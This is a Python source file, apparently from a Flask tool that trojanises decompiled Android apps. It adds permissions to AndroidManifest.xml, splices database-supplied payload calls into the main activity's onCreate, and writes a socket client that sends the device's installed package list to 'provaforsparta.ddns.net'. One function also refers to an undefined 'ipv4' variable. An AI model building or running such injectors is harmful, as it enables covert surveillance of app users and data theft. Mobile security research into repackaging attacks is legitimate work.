import pickle

from flask import session
from bs4 import BeautifulSoup as bs
from utils.utils_func import filename_cutter, string_to_list, open_file
import xml.etree.ElementTree as ET
import re, os, json
from utils.global_const import DECOMPILED_APK, xml_identifier, permission_suffix, MANIFEST_FILE, INTENT_FILTER, \
    ON_CREATE_PUBLIC, \
    ON_CREATE_PRIVATE, \
    ON_CREATE_PROTECTED, ON_CREATE_RETURN, MAIN_ACTIVITY_NAME, MAIN_ACTIVITY_PATH, MAIN_ACTIVITY_PACK, PATH_SUFFIX, \
    PACKAGE_LIST, SHARED_NAME, PACKAGE_TEST
from utils.query import query


def get_package(file):
    manifest_path = "decompiled_apk/" + filename_cutter(file) + "/AndroidManifest.xml"
    tree = ET.parse(manifest_path)
    item = tree.getroot()
    package = item.get('package')
    print('The package of this application is: ' + package)
    return package


def check_main_activity_name(file):
    manifest_path = DECOMPILED_APK + '/' + filename_cutter(file) + MANIFEST_FILE
    manifest = open_file(manifest_path)

    manifest_parsed = bs(manifest, "lxml")
    activities = manifest_parsed.find_all("activity")

    for activity in activities:
        intents = activity.find_all('intent-filter')
        for intent in intents:
            action = intent.find('action')
            diz_attrs = dict(action.attrs)

            if 'android:name' in diz_attrs and diz_attrs['android:name'] == 'android.intent.action.MAIN':
                print(activity.attrs['android:name'])
                return activity.attrs['android:name']


def get_main_activity(filename):
    manifest_path = DECOMPILED_APK + '/' + filename_cutter(filename) + MANIFEST_FILE
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    activities = []
    for activity in root.iter('activity'):
        activities.append(activity.attrib)

    activityMain = check_main_activity_name(filename)
    activityMainPath = r'decompiled_apk/' + filename_cutter(filename) + "/smali/" + activityMain.replace('.',
                                                                                                         '/') + '.smali'

    if not os.path.exists(activityMainPath):
        print('NOT EXITS')
        activityMainPath = r'decompiled_apk/' + filename_cutter(filename) + "/smali/" + get_package(
            filename).replace(".", "/") + '/' + activityMain.replace('.', '/').replace(" ", "") + '.smali'

    print('The activityMain is:', activityMain)
    print("The path of activityMain is: ", activityMainPath)
    return activityMainPath, activityMain


def permission_is_present(permission_to_check, application_permissions):
    for permission in application_permissions:
        if permission_to_check in permission[xml_identifier]:
            return True
    return False


def add_permission(file, permissions_required):
    manifest_path = "decompiled_apk/" + filename_cutter(file) + "/AndroidManifest.xml"
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    application_permissions = []

    if permissions_required is not None:
        if "," in permissions_required:
            permissions_required = string_to_list(permissions_required, ",")
        print('Required Permissions: ', permissions_required)

        for permission in root.findall("uses-permission"):
            application_permissions.append(permission.attrib)
        print("AndroidManifest's Permission: ", application_permissions)

        for permission in permissions_required:
            if not permission_is_present(permission, application_permissions):
                print(permission, " isn't present in AndroidManifest.")
                new_permission = ET.Element(permission_suffix, {xml_identifier: permission})
                root.append(new_permission)
                ET.ElementTree(root).write(manifest_path)
                print(permission, "Permission was Added")
    else:
        print("This injection, don't use permissions")


def check_onCreate_access_keyword(activityMain_content):
    onCreate_init = ''
    if ON_CREATE_PROTECTED in activityMain_content:
        onCreate_init = activityMain_content.index(ON_CREATE_PROTECTED)
    if ON_CREATE_PUBLIC in activityMain_content:
        onCreate_init = activityMain_content.index(ON_CREATE_PUBLIC)
    if ON_CREATE_PRIVATE in activityMain_content:
        onCreate_init = activityMain_content.index(ON_CREATE_PRIVATE)

    return onCreate_init


def add_socket_client(file, activityMainPath, path):
    print(activityMainPath)
    package_app = get_package(file)
    path.replace(".", "/")
    app_name = activityMainPath.split("/")[-1].strip(".smali")
    app_package = activityMainPath.replace(app_name + ".smali", "")
    # TODO ADD DNS ADDRESS
    # ipv4 = os.popen('ifconfig en0').read().split("inet ")[1].split(" ")[0]
    #
    # print("IP:", ipv4)
    original_file = query(4)
    permissions = original_file[0][0]
    invoke = original_file[0][1]
    socket_client = original_file[0][2]
    socket_client = re.sub(MAIN_ACTIVITY_PATH, 'L' + package_app.replace(".", "/"), socket_client)
    socket_client = re.sub(MAIN_ACTIVITY_NAME, app_name, socket_client)
    socket_client = re.sub('192.168.1.15', 'provaforsparta.ddns.net', socket_client)

    package_list = PACKAGE_LIST['init'] + str(len(session['package'])) + PACKAGE_LIST['new_array']
    i = 0

    for package in session['package']:
        package_list += PACKAGE_LIST['entry_counter'] + str(i) + PACKAGE_LIST['before_entry'] + package + PACKAGE_LIST[
            'after_entry']
        i = i + 1

    package_list += PACKAGE_LIST['after_array'] + PACKAGE_LIST['log'] + PACKAGE_LIST['final']
    socket_client += package_list

    send_file = open(os.path.join(app_package, app_name + "$send.smali"), "w+")
    send_file.write(socket_client)
    send_file.close()

    add_permission(file, permissions)
    main_activity = open(activityMainPath)
    main = main_activity.read()

    onCreate_init = check_onCreate_access_keyword(main)

    before_onCreate = main[0:onCreate_init:]
    onCreate_final = main.index(ON_CREATE_RETURN, onCreate_init)
    onCreate = main[onCreate_init:onCreate_final:]

    invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + package_app.replace(".", "/"), invoke)

    smali = before_onCreate + onCreate + invoke + "\n" + main[onCreate_final:len(main)] + "\n"

    main_activity.close()
    main_activity = open(activityMainPath, "w")
    main_activity.write(smali)
    main_activity.close()

    session.clear()


def mainActivity_modifier(file, injection_type, client_payload):
    # print(string)
    activityMainPath, path = get_main_activity(file)
    path_mod = path.replace(".", "/")
    print("PATH:", path)
    package = get_package(file)
    # print(activityMainPath)
    injection = query(injection_type)
    # print(injection)
    if not injection[0][0]:
        permission = injection[0][0]
    else:
        permission = injection[0][0].rsplit(",")
    # print(permission)
    invoke = injection[0][1]
    functions = injection[0][2]
    add_permission(file, permission)

    activityMain_file = open(activityMainPath)
    activityMain_content = activityMain_file.read()
    # print("Text of mainActivity"+content)

    onCreate_init = check_onCreate_access_keyword(activityMain_content)

    before_onCreate = activityMain_content[0:onCreate_init:]
    onCreate_final = activityMain_content.index(ON_CREATE_RETURN, onCreate_init)
    onCreate = activityMain_content[onCreate_init:onCreate_final:]

    invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + package.replace(".", "/") + ";", invoke)

    if functions != '':
        functions = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + package.replace(".", "/") + ";", functions)
        functions = re.sub(MAIN_ACTIVITY_PACK, package + SHARED_NAME, functions)

        # print(functions)
        activityMain_content = before_onCreate + onCreate + invoke + "\n" + activityMain_content[onCreate_final:len(
            activityMain_content)] + functions
    else:
        activityMain_content = before_onCreate + onCreate + invoke + "\n" + activityMain_content[
                                                                            onCreate_final:len(activityMain_content)]

    # print(ok)
    activityMain_file.close()
    activityMain_file = open(activityMainPath, "w")
    activityMain_file.write(activityMain_content)
    activityMain_file.close()


    if client_payload == 'client':
        add_socket_client(file, activityMainPath, path)
        print('Socket client was added')
    else:
        if 'package' not in session:
            session['package'] = PACKAGE_TEST
        #session['package'].append(package)
        #session.modified = True
        print(session['package'])
        print("this application isn't the last, socket client skip")


def mainActivity_socket_client(file, injection_type):
    activityMainPath, fer = get_main_activity(file)
    print('path:', fer)
    app_name = activityMainPath.split("/")[-1].strip(".smali")
    app_package = activityMainPath.replace(app_name + ".smali", "")

    # TODO ADD DNS ADDRESS
    #ipv4 = os.popen('ifconfig en0').read().split("inet ")[1].split(" ")[0]

    # Attack component
    attack_parts = query(injection_type)
    permissions = attack_parts[0][0]
    invoke = attack_parts[0][1]
    send = attack_parts[0][2]

    send = re.sub(MAIN_ACTIVITY_PATH, 'L' + fer.replace(".", "/"), send)
    send = re.sub(MAIN_ACTIVITY_NAME, app_name, send)
    send = re.sub('192.168.1.15', ipv4, send)

    print(send)

    send_file = open(os.path.join(app_package, app_name + "$send.smali"), "w+")
    send_file.write(send)
    send_file.close()

    add_permission(file, permissions)
    main_activity = open(activityMainPath)
    mainActivity = main_activity.read()

    onCreate_init = check_onCreate_access_keyword(mainActivity)

    before_onCreate = mainActivity[0:onCreate_init:]
    onCreate_final = mainActivity.index(ON_CREATE_RETURN, onCreate_init)
    onCreate = mainActivity[onCreate_init:onCreate_final:]

    invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + fer.replace(".", "/"), invoke)
    smali = before_onCreate + onCreate + invoke + "\n" + mainActivity[onCreate_final:len(mainActivity)] + "\n"
    # print(smali)

    main_activity.close()
    main_activity = open(activityMainPath, "w")
    main_activity.write(smali)
    main_activity.close()
